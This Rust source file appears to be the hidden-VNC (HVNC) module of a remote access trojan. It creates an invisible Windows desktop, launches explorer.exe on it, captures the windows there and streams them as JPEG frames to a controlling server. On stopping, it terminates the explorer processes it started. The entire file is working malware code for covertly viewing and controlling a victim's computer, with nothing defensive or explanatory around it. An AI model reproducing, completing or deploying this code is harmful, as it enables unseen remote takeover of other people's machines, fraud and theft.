use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use std::sync::Mutex;
use serde;

use screenshots::{image, Screen};
use std::io::Cursor;

use common::packets::ServerboundPacket;
use crate::handler::send_packet;

use winapi::um::winuser::{
    CreateDesktopA,
    OpenDesktopA,
    CloseDesktop,
    SetThreadDesktop,
    GetDesktopWindow,
    GetDC,
    ReleaseDC,
    GetWindowRect,
    PrintWindow,
    GetTopWindow,
    GetWindow,
    IsWindowVisible,
    GW_HWNDLAST,
    GW_HWNDPREV,
    DESKTOP_CREATEWINDOW,
    DESKTOP_WRITEOBJECTS,
    DESKTOP_READOBJECTS,
    DESKTOP_SWITCHDESKTOP,
    DESKTOP_ENUMERATE,
    EnumDesktopWindows,
    GetWindowThreadProcessId
};
use winapi::um::winnt::GENERIC_ALL;
use winapi::um::wingdi::{
    CreateCompatibleDC,
    CreateCompatibleBitmap,
    SelectObject,
    DeleteObject,
    DeleteDC,
    GetDeviceCaps,
    GetDIBits,
    BITMAPINFO, 
    BITMAPINFOHEADER, 
    BI_RGB, 
    DIB_RGB_COLORS,
    HORZRES,
    VERTRES
};
use winapi::shared::windef::{HWND, HDC, RECT, HBITMAP, HGDIOBJ};
use winapi::shared::minwindef::{BOOL, DWORD, TRUE, FALSE};
use std::ffi::{OsStr, CString};
use std::os::windows::ffi::OsStrExt;
use std::mem::zeroed;
use std::ptr::null_mut;
use std::iter::once;

// Struct for HVNC process creation
#[repr(C)]
struct StartupInfoA {
    cb: u32,
    lpReserved: *mut i8,
    lpDesktop: *mut i8,
    lpTitle: *mut i8,
    dwX: u32,
    dwY: u32,
    dwXSize: u32,
    dwYSize: u32,
    dwXCountChars: u32,
    dwYCountChars: u32,
    dwFillAttribute: u32,
    dwFlags: u32,
    wShowWindow: u16,
    cbReserved2: u16,
    lpReserved2: *mut u8,
    hStdInput: *mut winapi::ctypes::c_void,
    hStdOutput: *mut winapi::ctypes::c_void,
    hStdError: *mut winapi::ctypes::c_void,
}

struct ProcessInformation {
    hProcess: *mut winapi::ctypes::c_void,
    hThread: *mut winapi::ctypes::c_void,
    dwProcessId: u32,
    dwThreadId: u32,
}

// Safely encode a string for use with Windows APIs
fn to_wstring(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(once(0))
        .collect()
}

// Static HVNC state
static HVNC_ACTIVE: Mutex<Option<Arc<AtomicBool>>> = Mutex::new(None);
static DESKTOP_NAME: Mutex<&str> = Mutex::new("Desktopx2");

extern "system" {
    fn CreateProcessA(
        lpApplicationName: *const i8,
        lpCommandLine: *mut i8,
        lpProcessAttributes: *mut winapi::ctypes::c_void,
        lpThreadAttributes: *mut winapi::ctypes::c_void,
        bInheritHandles: BOOL,
        dwCreationFlags: DWORD,
        lpEnvironment: *mut winapi::ctypes::c_void,
        lpCurrentDirectory: *const i8,
        lpStartupInfo: *mut StartupInfoA,
        lpProcessInformation: *mut ProcessInformation,
    ) -> BOOL;
}

pub fn start_hvnc() {
    // If already running, stop it first
    stop_hvnc();

    // Create a new stop flag
    let stop_flag = Arc::new(AtomicBool::new(false));
    
    // Store the stop flag
    let mut active = HVNC_ACTIVE.lock().unwrap();
    *active = Some(Arc::clone(&stop_flag));
    
    // Create or get the hidden desktop
    let desktop_name = DESKTOP_NAME.lock().unwrap().clone();
    println!("Starting HVNC with desktop name: {}", desktop_name);
    
    // Start frame capture thread
    thread::spawn(move || {
        // Create a new Tokio runtime for this thread
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("Failed to create Tokio runtime");
            
        // Get a reference to the stop flag
        let stop_flag = HVNC_ACTIVE.lock().unwrap().as_ref().unwrap().clone();
        
        // Create image handler for our desktop
        let mut hvnc_desktop = unsafe {
            // Convert desktop name to CString for the API call
            let desktop_name_cstr = match CString::new(desktop_name) {
                Ok(cstr) => cstr,
                Err(_) => {
                    println!("Failed to convert desktop name to CString");
                    return;
                }
            };
            
            // Use correct access flags - these are critical for HVNC to work
            let access_flags = DESKTOP_CREATEWINDOW | 
                               DESKTOP_WRITEOBJECTS | 
                               DESKTOP_READOBJECTS | 
                               DESKTOP_SWITCHDESKTOP |
                               DESKTOP_ENUMERATE |
                               0x10000000; // GENERIC_ALL
            
            // Try to open existing desktop first
            let desktop_handle = OpenDesktopA(
                desktop_name_cstr.as_ptr() as *const i8,
                0,
                FALSE,
                access_flags
            );
            
            // If it doesn't exist, create a new one
            let desktop_handle = if desktop_handle.is_null() {
                println!("Creating new HVNC desktop: {}", desktop_name);
                let new_handle = CreateDesktopA(
                    desktop_name_cstr.as_ptr() as *const i8,
                    null_mut(),
                    null_mut(),
                    0,
                    access_flags,
                    null_mut()
                );
                
                if new_handle.is_null() {
                    println!("Failed to create HVNC desktop, error: {}", 
                             winapi::um::errhandlingapi::GetLastError());
                } else {
                    println!("Successfully created HVNC desktop");
                }
                
                new_handle
            } else {
                println!("Using existing HVNC desktop");
                desktop_handle
            };
            
            desktop_handle
        };
        
        // If we couldn't create or open the desktop, exit the thread
        if hvnc_desktop.is_null() {
            println!("HVNC desktop is null, cannot continue");
            return;
        }
        
        // Try to set the thread to the HVNC desktop
        let desktop_set = unsafe {
            SetThreadDesktop(hvnc_desktop) != 0
        };
        
        if !desktop_set {
            println!("Failed to set thread desktop, error: {}", 
                    unsafe { winapi::um::errhandlingapi::GetLastError() });
            unsafe { CloseDesktop(hvnc_desktop) };
            return;
        }
        
        println!("Thread successfully set to HVNC desktop");
        
        // Stream frames as long as active
        while !stop_flag.load(Ordering::Relaxed) {
            // Get desktop dimensions
            let (width, height) = unsafe {
                let dc = GetDC(null_mut());
                let w = GetDeviceCaps(dc, HORZRES);
                let h = GetDeviceCaps(dc, VERTRES);
                ReleaseDC(null_mut(), dc);
                (w, h)
            };
            
            let mut frame_data = Vec::new();
            
            unsafe {
                // Capture desktop image
                let dc = GetDC(null_mut());
                if !dc.is_null() {
                    let mem_dc = CreateCompatibleDC(dc);
                    if !mem_dc.is_null() {
                        let bitmap = CreateCompatibleBitmap(dc, width, height);
                        if !bitmap.is_null() {
                            let old_obj = SelectObject(mem_dc, bitmap as HGDIOBJ);
                            
                            // Capture visible windows
                            let _ = capture_windows(mem_dc);
                            
                            // Convert to image and compress
                            let raw_data = extract_bitmap_data(bitmap, width, height);
                            
                            if let Some(img) = image::RgbaImage::from_raw(
                                width as u32, 
                                height as u32, 
                                raw_data
                            ) {
                                let dynamic_img = image::DynamicImage::ImageRgba8(img);
                                
                                // Compress to JPEG and send
                                if dynamic_img.write_to(
                                    &mut Cursor::new(&mut frame_data),
                                    image::ImageOutputFormat::Jpeg(70), // 70% quality
                                ).is_ok() {
                                    // Only send if we have data
                                    if !frame_data.is_empty() {
                                        // Send frame
                                        let packet = ServerboundPacket::HVNCFrame(frame_data);
                                        
                                        if let Err(e) = rt.block_on(send_packet(packet)) {
                                            println!("Failed to send HVNC frame: {}", e);
                                        }
                                    }
                                }
                            }
                            
                            // Clean up
                            SelectObject(mem_dc, old_obj);
                            DeleteObject(bitmap as HGDIOBJ);
                        }
                        DeleteDC(mem_dc);
                    }
                    ReleaseDC(null_mut(), dc);
                }
            }
            
            // Sleep to control frame rate (about 5 FPS)
            thread::sleep(Duration::from_millis(200));
        }
        
        // Cleanup desktop
        unsafe {
            if !hvnc_desktop.is_null() {
                CloseDesktop(hvnc_desktop);
            }
        }
    });
}

pub fn stop_hvnc() {
    // Set the stop flag to stop the streaming thread
    let mut active = HVNC_ACTIVE.lock().unwrap();
    if let Some(flag) = active.as_ref() {
        flag.store(true, Ordering::Relaxed);
        *active = None;
    }
    
    // Get the desktop name
    let desktop_name = DESKTOP_NAME.lock().unwrap().clone();
    println!("Stopping HVNC and cleaning up desktop: {}", desktop_name);
    
    // Spawn a thread to properly clean up the desktop
    thread::spawn(move || {
        // Give a moment for the streaming thread to stop
        thread::sleep(Duration::from_millis(500));
        
        unsafe {
            // Find all processes on the HVNC desktop and terminate them
            kill_all_processes_on_desktop(&desktop_name);
            
            // Try to open the desktop to close it
            if let Ok(desktop_cstr) = CString::new(desktop_name) {
                let desktop_handle = OpenDesktopA(
                    desktop_cstr.as_ptr() as *const i8,
                    0,
                    FALSE,
                    DESKTOP_READOBJECTS | DESKTOP_ENUMERATE
                );
                
                if !desktop_handle.is_null() {
                    println!("Closing HVNC desktop");
                    CloseDesktop(desktop_handle);
                }
            }
            
            // Attempt to close/switch from the desktop to ensure it's not in use
            if let Ok(workstation_name) = CString::new("WinSta0\\Default") {
                let default_desktop = OpenDesktopA(
                    workstation_name.as_ptr() as *const i8, 
                    0, 
                    FALSE, 
                    DESKTOP_SWITCHDESKTOP
                );
                
                if !default_desktop.is_null() {
                    // Switch to default desktop to ensure resources are freed
                    SetThreadDesktop(default_desktop);
                    CloseDesktop(default_desktop);
                }
            }
        }
        
        println!("HVNC cleanup completed");
    });
}

// Helper function to kill all processes on the specified desktop
unsafe fn kill_all_processes_on_desktop(desktop_name: &str) {
    // Import required WinAPI functions
    use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::winnt::PROCESS_TERMINATE;
    use winapi::shared::minwindef::DWORD;
    
    // Import Process32First/Next using direct extern declarations since the module path is different
    #[allow(non_snake_case)]
    extern "system" {
        fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) -> HANDLE;
        fn Process32FirstW(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32W) -> BOOL;
        fn Process32NextW(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32W) -> BOOL;
    }
    
    type HANDLE = *mut winapi::ctypes::c_void;
    
    #[repr(C)]
    struct PROCESSENTRY32W {
        dwSize: DWORD,
        cntUsage: DWORD,
        th32ProcessID: DWORD,
        th32DefaultHeapID: usize,
        th32ModuleID: DWORD,
        cntThreads: DWORD,
        th32ParentProcessID: DWORD,
        pcPriClassBase: i32,
        dwFlags: DWORD,
        szExeFile: [u16; 260],
    }
    
    const TH32CS_SNAPPROCESS: DWORD = 0x00000002;
    
    println!("Terminating explorer.exe processes on HVNC desktop: {}", desktop_name);
    
    // Store the PIDs of processes on our HVNC desktop
    let mut hvnc_desktop_pids: Vec<DWORD> = Vec::new();
    
    // Open the HVNC desktop
    if let Ok(desktop_cstr) = CString::new(desktop_name) {
        let desktop_handle = OpenDesktopA(
            desktop_cstr.as_ptr() as *const i8,
            0,
            FALSE,
            DESKTOP_READOBJECTS | DESKTOP_ENUMERATE
        );
        
        if !desktop_handle.is_null() {
            // Use a callback function to enumerate windows on the desktop
            extern "system" fn enum_windows_callback(hwnd: HWND, lparam: isize) -> BOOL {
                unsafe {
                    let pid_vec = &mut *(lparam as *mut Vec<DWORD>);
                    let mut process_id: DWORD = 0;
                    
                    // Get process ID from window handle
                    GetWindowThreadProcessId(hwnd, &mut process_id);
                    
                    // Add process ID to our list if not already there
                    if process_id != 0 && !pid_vec.contains(&process_id) {
                        pid_vec.push(process_id);
                    }
                }
                TRUE
            }
            
            // Enumerate all windows on the HVNC desktop
            let result = EnumDesktopWindows(
                desktop_handle,
                Some(enum_windows_callback),
                &mut hvnc_desktop_pids as *mut Vec<DWORD> as isize
            );
            
            if result == 0 {
                println!("EnumDesktopWindows failed: {}", 
                         winapi::um::errhandlingapi::GetLastError());
            }
            
            CloseDesktop(desktop_handle);
        } else {
            println!("Failed to open HVNC desktop for process termination");
        }
    }
    
    println!("Found {} processes on HVNC desktop", hvnc_desktop_pids.len());
    
    // If we found no processes on the desktop, there's nothing to terminate
    if hvnc_desktop_pids.is_empty() {
        println!("No processes found running on HVNC desktop");
        return;
    }
    
    // Create a snapshot of all processes
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snapshot.is_null() {
        println!("Failed to create process snapshot");
        return;
    }
    
    // Create and populate the process entry structure
    let mut pe32: PROCESSENTRY32W = std::mem::zeroed();
    pe32.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
    
    // Iterate through all processes
    if Process32FirstW(snapshot, &mut pe32) != 0 {
        loop {
            // Only process explorer.exe
            let name = String::from_utf16_lossy(
                &pe32.szExeFile[..pe32.szExeFile.iter().position(|&c| c == 0).unwrap_or(pe32.szExeFile.len())]
            );
            
            if name.to_lowercase().contains("explorer") {
                // Check if this explorer.exe is on our HVNC desktop
                if hvnc_desktop_pids.contains(&pe32.th32ProcessID) {
                    // Only terminate if it's not our current process
                    if pe32.th32ProcessID != winapi::um::processthreadsapi::GetCurrentProcessId() {
                        // Try to open the process
                        let process = OpenProcess(PROCESS_TERMINATE, 0, pe32.th32ProcessID);
                        if !process.is_null() {
                            println!("Terminating HVNC explorer.exe (PID: {})", pe32.th32ProcessID);
                            TerminateProcess(process, 0);
                            CloseHandle(process);
                        }
                    }
                } else {
                    println!("Skipping explorer.exe (PID: {}) not on HVNC desktop", pe32.th32ProcessID);
                }
            }
            
            // Move to the next process
            if Process32NextW(snapshot, &mut pe32) == 0 {
                break;
            }
        }
    }
    
    // Close the snapshot handle
    CloseHandle(snapshot);
    
    println!("Completed terminating explorer.exe processes on HVNC desktop");
}

// Helper function to open explorer on the HVNC desktop
pub fn open_explorer() {
    let desktop_name = DESKTOP_NAME.lock().unwrap().clone();
    println!("Opening Explorer on HVNC desktop: {}", desktop_name);
    
    // Create a separate thread to launch explorer on the HVNC desktop
    thread::spawn(move || {
        unsafe {
            let desktop_cstr = match CString::new(desktop_name) {
                Ok(cstr) => cstr,
                Err(_) => {
                    println!("Failed to convert desktop name to CString");
                    return;
                }
            };
            
            // Use correct access flags - these are critical for HVNC to work
            let access_flags = DESKTOP_CREATEWINDOW | 
                               DESKTOP_WRITEOBJECTS | 
                               DESKTOP_READOBJECTS | 
                               DESKTOP_SWITCHDESKTOP |
                               DESKTOP_ENUMERATE |
                               0x10000000; // GENERIC_ALL
            
            // Open the desktop
            let hvnc_desktop = OpenDesktopA(
                desktop_cstr.as_ptr() as *const i8,
                0,
                FALSE,
                access_flags
            );
            
            if hvnc_desktop.is_null() {
                println!("Failed to open HVNC desktop, error: {}", 
                         winapi::um::errhandlingapi::GetLastError());
                return;
            }
            
            // Switch to the desktop
            if SetThreadDesktop(hvnc_desktop) == 0 {
                println!("Failed to set thread desktop, error: {}", 
                         winapi::um::errhandlingapi::GetLastError());
                CloseDesktop(hvnc_desktop);
                return;
            }
            
            println!("Thread switched to HVNC desktop");
            
            // Create desktop path in format WinSta0\<desktop_name>
            let desktop_path = format!("WinSta0\\{}", desktop_name);
            let desktop_path_clone = desktop_path.clone();
            let desktop_path_cstr = match CString::new(desktop_path) {
                Ok(cstr) => cstr,
                Err(_) => {
                    println!("Failed to create desktop path CString");
                    CloseDesktop(hvnc_desktop);
                    return;
                }
            };
            
            // Create command line string
            let command = match CString::new("explorer.exe") {
                Ok(cmd) => cmd,
                Err(_) => {
                    println!("Failed to create command line CString");
                    CloseDesktop(hvnc_desktop);
                    return;
                }
            };
            
            // Create a mutable copy of the command
            let cmd_len = command.as_bytes_with_nul().len();
            let mut cmd_buf = vec![0i8; cmd_len];
            for (i, &byte) in command.as_bytes_with_nul().iter().enumerate() {
                cmd_buf[i] = byte as i8;
            }
            
            // Properly initialize the STARTUPINFO structure
            let mut si: StartupInfoA = zeroed();
            si.cb = std::mem::size_of::<StartupInfoA>() as u32;
            si.lpDesktop = desktop_path_cstr.as_ptr() as *mut i8;
            
            // Show the window
            si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
            si.wShowWindow = 5;      // SW_SHOW
            
            // Initialize process information
            let mut pi: ProcessInformation = zeroed();
            
            // Create the process
            println!("Creating explorer.exe process on {} desktop", desktop_path_clone);
            let result = CreateProcessA(
                null_mut(),              // No application name (use command line)
                cmd_buf.as_mut_ptr(),    // Command line
                null_mut(),              // Process security attributes
                null_mut(),              // Thread security attributes
                FALSE,                   // Don't inherit handles
                0x00000010,              // CREATE_NEW_CONSOLE
                null_mut(),              // Use parent's environment
                null_mut(),              // Use parent's current directory
                &mut si,                 // Startup info with desktop name
                &mut pi                  // Process information
            );
            
            if result == 0 {
                println!("Failed to create explorer.exe process, error: {}", 
                         winapi::um::errhandlingapi::GetLastError());
            } else {
                println!("Explorer.exe process created successfully");
                
                // Close process and thread handles
                winapi::um::handleapi::CloseHandle(pi.hProcess);
                winapi::um::handleapi::CloseHandle(pi.hThread);
            }
            
            // Close the desktop handle
            CloseDesktop(hvnc_desktop);
        }
    });
}

// Helper function to capture all visible windows on the desktop
unsafe fn capture_windows(mem_dc: HDC) -> bool {
    // Get the desktop window
    let desktop_wnd = GetDesktopWindow();
    if desktop_wnd.is_null() {
        return false;
    }
    
    // Get desktop rect
    let mut desktop_rect: RECT = zeroed();
    if GetWindowRect(desktop_wnd, &mut desktop_rect) == 0 {
        return false;
    }
    
    // Start with the bottom window (paint it first)
    let mut hwnd = GetTopWindow(null_mut());
    if hwnd.is_null() {
        return false;
    }
    
    // Get last window in Z-order
    hwnd = GetWindow(hwnd, GW_HWNDLAST);
    if hwnd.is_null() {
        return false;
    }
    
    // Now process windows from bottom to top (proper Z-order)
    while !hwnd.is_null() {
        if IsWindowVisible(hwnd) != 0 {
            // Get window rect
            let mut rect: RECT = zeroed();
            if GetWindowRect(hwnd, &mut rect) != 0 {
                // Print the window to our DC
                PrintWindow(hwnd, mem_dc, 2); // PW_RENDERFULLCONTENT = 2
            }
        }
        
        // Move to previous window (up in Z-order)
        hwnd = GetWindow(hwnd, GW_HWNDPREV);
    }
    
    true
}

// Helper function to extract bitmap data
unsafe fn extract_bitmap_data(bitmap: HBITMAP, width: i32, height: i32) -> Vec<u8> {
    // Create an RGBA buffer of the right size
    let mut buffer = vec![0u8; (width * height * 4) as usize];
    
    // Get a DC for operations
    let dc = GetDC(null_mut());
    if dc.is_null() {
        return buffer; // Return empty buffer on failure
    }
    
    // Set up the bitmap info header
    let mut bi = BITMAPINFO {
        bmiHeader: BITMAPINFOHEADER {
            biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
            biWidth: width,
            biHeight: -height, // Negative for top-down
            biPlanes: 1,
            biBitCount: 32,    // 32-bit RGBA
            biCompression: BI_RGB,
            biSizeImage: 0,
            biXPelsPerMeter: 0,
            biYPelsPerMeter: 0,
            biClrUsed: 0,
            biClrImportant: 0,
        },
        bmiColors: [std::mem::zeroed()],
    };
    
    // Get the actual bitmap data
    let result = GetDIBits(
        dc, 
        bitmap, 
        0, 
        height as u32, 
        buffer.as_mut_ptr() as *mut winapi::ctypes::c_void, 
        &mut bi, 
        DIB_RGB_COLORS
    );
    
    // Release the DC
    ReleaseDC(null_mut(), dc);
    
    // Check if we were successful
    if result == 0 {
        println!("GetDIBits failed with error: {}", winapi::um::errhandlingapi::GetLastError());
    }
    
    buffer
}